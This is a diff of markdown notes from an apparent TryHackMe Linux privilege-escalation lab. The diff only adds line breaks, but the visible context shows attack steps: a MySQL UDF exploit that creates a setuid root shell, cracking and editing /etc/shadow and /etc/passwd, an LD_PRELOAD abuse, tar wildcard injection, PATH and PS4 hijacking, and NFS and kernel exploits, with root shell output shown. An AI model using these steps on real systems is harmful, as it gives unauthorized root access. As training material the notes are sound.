@@ -1,10 +1,10 @@
 ***`Services Exploit`***
 
-[+] Service: Mysql 
-[+] Technique: UDF 
+[+] Service: Mysql <br>
+[+] Technique: UDF <br>
 [+] Exploit : [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/1518)
 
-[+] Steps
+[+] Steps<br>
 -   compile Exploit source code
 ```bash
 gcc -g -c raptor_udf2.c -fPIC  
@@ -41,10 +41,10 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
 
 ***`Weak File Permissions - Readable /etc/shadow`***
 
-[+] Technique: Brute-Force shadow password
-[+] Shadow it's writable/Readable
-[+] Link: [Cracking /etc/shadow with John | - erev0s.com](https://erev0s.com/blog/cracking-etcshadow-john/)
-[+] Steps
+[+] Technique: Brute-Force shadow password<br>
+[+] Shadow it's writable/Readable<br>
+[+] Link: [Cracking /etc/shadow with John | - erev0s.com](https://erev0s.com/blog/cracking-etcshadow-john/)<br>
+[+] Steps<br>
 
 - extract root section from /etc/password and /etc/shadow
 
@@ -96,9 +96,9 @@ Session completed.
 
 ***`Weak File Permissions - Writable /etc/shadow`***
 
-[+] Technique: Edit /etc/shadow file
-[+] Shadow it's writable/Readable
-[+] Steps
+[+] Technique: Edit /etc/shadow file<br>
+[+] Shadow it's writable/Readable<br>
+[+] Steps<br>
 
 - generate password
 ```bash
@@ -113,9 +113,9 @@ su root
 
 ***`Weak File Permissions - Writable /etc/passwd`***
 
-[+] Technique: Edit /etc/passwd file
-[+] passwd it's writable/Readable
-[+] Steps
+[+] Technique: Edit /etc/passwd file<br>
+[+] passwd it's writable/Readable<br>
+[+] Steps<br>
 
 
 - generate password using `openssl`
@@ -135,8 +135,8 @@ su root
 
 ***`Sudo - Shell Escape Sequences`***
 
-[+] Technique:  exploit weakness with binary 
-[+] Link: [https://gtfobins.github.io](https://gtfobins.github.io/)
+[+] Technique:  exploit weakness with binary <br>
+[+] Link: [https://gtfobins.github.io](https://gtfobins.github.io/)<br>
 
 
 
@@ -158,7 +158,7 @@ Matching Defaults entries for user on this host:
 `LD_PRELOAD`: loads a shared object before any others when a program is run
 `LD_LIBRARY_PATH`: provides a list of directories where shared libraries are searched for first
 
-[+] setps
+[+] setps<br>
 - create lib file
 
 *preload.c*
@@ -193,7 +193,7 @@ sudo LD_PRELOAD=/tmp/preload.so less
 * exploit binary that doest list in gtfobin with sudo env 
 
 
-[+] steps
+[+] steps<br>
 - run load library against binary file.
 
 ```bash
@@ -237,7 +237,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ***`Cron Jobs - File Permissions`***
 
-[+] view crons
+[+] view crons<br>
 ```bash
 
 user@debian:/tmp$ cat /etc/crontab
@@ -260,9 +260,9 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 ```
 
-[+] exploit tar in cron
-[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)
-[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+[+] exploit tar in cron<br>
+[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)<br>
+[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)<br>
 
 
 ```bash
@@ -306,7 +306,7 @@ chmod +xs /tmp/rootbash
 
 
 
-[+]steps
+[+]steps<br>
 - create bash script on dir that run by cron process and make it executable `chmod +x overwrite.sh `
 -  make sure PATH start with user controlled dir where bash script allocate in order to hijack run script like path weakness vulnerability.
 
@@ -343,23 +343,23 @@ echo "" > --checkpoint=1
 ```
 
 
-[+] exploit tar in cron
-[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)
-[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+[+] exploit tar in cron<br>
+[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)<br>
+[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)<br>
 
 
 
 ***`SUID / SGID Executables - Known Exploits`***
 
-[+] Find all SUID/SGID 
+[+] Find all SUID/SGID <br>
 
 ```bash
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 ```
 
-[+] vulnerable: Exim 
-[+]Link: [Exim 4.84-3 - Local Privilege Escalation - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/39535)
+[+] vulnerable: Exim <br>
+[+]Link: [Exim 4.84-3 - Local Privilege Escalation - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/39535)<br>
 
 ```bash
 nano /tmp/root.pm
@@ -408,7 +408,7 @@ open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or dir
 
 `/home/user/.config/libcalc.so` can't find that  library.
 
-[+] exploit steps
+[+] exploit steps<br>
 - create dir  .config and create `libcalc.so`  library
 *`libcalc.so`*
 ```c
@@ -466,9 +466,9 @@ bash-4.1#
 
 ***` SUID / SGID Executables - Environment Variables`***
 
-[+] technique: path weakness
+[+] technique: path weakness<br>
 
-[+] steps
+[+] steps<br>
 - run strings  to detect any call for binary files without using absolute path
 
 ```bash
@@ -530,11 +530,11 @@ uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44
 
 **` SUID / SGID Executables - Abusing Shell Features (#1)`**
 
-[+] bypass absolute path: vulnerability in bash <4.2.048 
-[+] technique:  overwrite absolute path  by creating function which name look like absolute path
+[+] bypass absolute path: vulnerability in bash <4.2.048 <br>
+[+] technique:  overwrite absolute path  by creating function which name look like absolute path<br>
 
 
-[+] steps
+[+] steps<br>
 
 - run strings to look for 
 
@@ -582,9 +582,9 @@ uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44
 
 **` SUID / SGID Executables - Abusing Shell Features (#2)`**
 
-[+] technique : by exploit debugging environment variable `PS4` 
+[+] technique : by exploit debugging environment variable `PS4` <br>
 
-[+] Steps
+[+] Steps<br>
 - set `PS4` to bash command.
 
 ```bash
@@ -683,8 +683,8 @@ total 4
 
 **`NFS`**
 
-[+] Links: [2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
-[NFS no_root_squash/no_all_squash misconfiguration PE - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
+[+] Links: [2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)<br>
+[NFS no_root_squash/no_all_squash misconfiguration PE - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)<br>
 
 Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
@@ -733,7 +733,7 @@ bash-4.1#
 
 **`Kernel Exploits`**
 
-[+] check kernel release date
+[+] check kernel release date<br>
 
 ```bash
 user@debian:/tmp$ uname -a
@@ -744,7 +744,7 @@ Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
 
 `13 May 2014` it's kernel release date which it's vulnerable to kernel exploit 
 
-[+] use searchsploit  to look for kernel exploit
+[+] use searchsploit  to look for kernel exploit<br>
 
 ```bash
 
@@ -861,5 +861,5 @@ uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip)
 
 
 
-**  Resource **
+#Resource <br>
 [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
